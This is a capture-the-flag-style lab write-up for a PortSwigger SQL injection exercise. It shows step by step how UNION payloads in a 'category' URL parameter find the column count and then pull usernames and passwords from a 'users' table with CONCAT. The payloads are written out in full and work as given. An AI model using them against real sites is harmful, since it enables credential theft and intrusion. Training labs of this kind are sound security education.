# SQL injection UNION attack, retrieving multiple values in a single column

This lab focuses on extracting multiple pieces of information when the
application displays only one useful value from the UNION result.

The database contains a `users` table with `username` and `password`
columns. The objective remains to retrieve the administrator credentials
and use them to log in.

Hint: Useful payloads can be found in the SQL injection cheat sheet.

------------------------------------------------------------------------

References:

-   https://portswigger.net/web-security/sql-injection/union-attacks
-   https://portswigger.net/web-security/sql-injection/cheat-sheet

------------------------------------------------------------------------

Only one value is displayed in the product table: the product name.

<img width="880" height="312" alt="1" src="https://github.com/user-attachments/assets/5a9888f9-16bd-44f8-b269-40546520bd27" />


The category parameter accepts the following payloads. The first targets
the Gifts category, while the second makes the condition true for all
categories:

``` text
/filter?category=Gifts'--
/filter?category=Gifts'+or+1=1--
```

The underlying query returns two columns, so a UNION query with two
values can be used:

``` text
/filter?category=Gifts'+union+all+select+NULL,NULL--
```

<img width="569" height="358" alt="2" src="https://github.com/user-attachments/assets/07624bbc-c67a-445f-9312-b208ce46f805" />


Since only one displayed column is useful, multiple strings can be
combined into that column with `CONCAT`:

``` text
/filter?category=Gifts'+union+all+select+NULL,CONCAT('foo','bar')--
```

This confirms that values from the second column can be combined and
displayed together.

<img width="559" height="372" alt="3" src="https://github.com/user-attachments/assets/0908e3de-1aa7-423f-b109-8a7ffc6b2950" />


The same approach can be applied to database values. The username and
password are joined with a colon so both values can be returned through
a single displayed column:

``` text
/filter?category=Gifts'+union+all+select+NULL,CONCAT(username,':',password)+from+users--
```

<img width="574" height="461" alt="4" src="https://github.com/user-attachments/assets/75ea9c35-4af8-4593-abaf-523c0c57e7f2" />

